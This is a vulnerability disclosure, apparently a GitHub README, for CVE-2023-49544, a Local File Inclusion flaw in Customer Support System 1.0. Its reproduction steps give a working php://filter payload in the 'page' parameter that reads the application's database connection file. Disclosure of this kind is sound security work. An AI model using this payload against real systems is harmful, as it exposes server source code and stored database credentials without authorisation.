# CVE-2023-49544
# Customer Support System 1.0 - Local File Inclusion

**Description**: Customer Support System 1.0 is vulnerable to Local File Inclusion. An authenticated user has the capability to access and read PHP files from the operating system by exploiting a Local File Inclusion (LFI) vulnerability through the wrapper filter.

**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**.: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49544     
**Tested on**: Windows  
### Steps to reproduce:  
1. Log in to the application with any user.  
2. Modify the vulnerable "page" parameter to exploit the vulnerability.  
Payload: php://filter/convert.base64-encode/resource=C:\xampp\htdocs\customer_support\db_connect    

Exploiting the vulnerability and retrieving the content of the PHP file in base64.
![lfi01](https://github.com/geraldoalcantara/LFI_Customer_Support_System-/assets/152064551/7482329e-af58-4829-971a-91d539d8b13e)

Reading the content of the file (Base64 decoded).
![lfi02](https://github.com/geraldoalcantara/LFI_Customer_Support_System-/assets/152064551/9488f5ac-4903-4879-bc60-6cbe70b55ad0)

Discoverer(s)/Credits:  
Geraldo Alcântara  
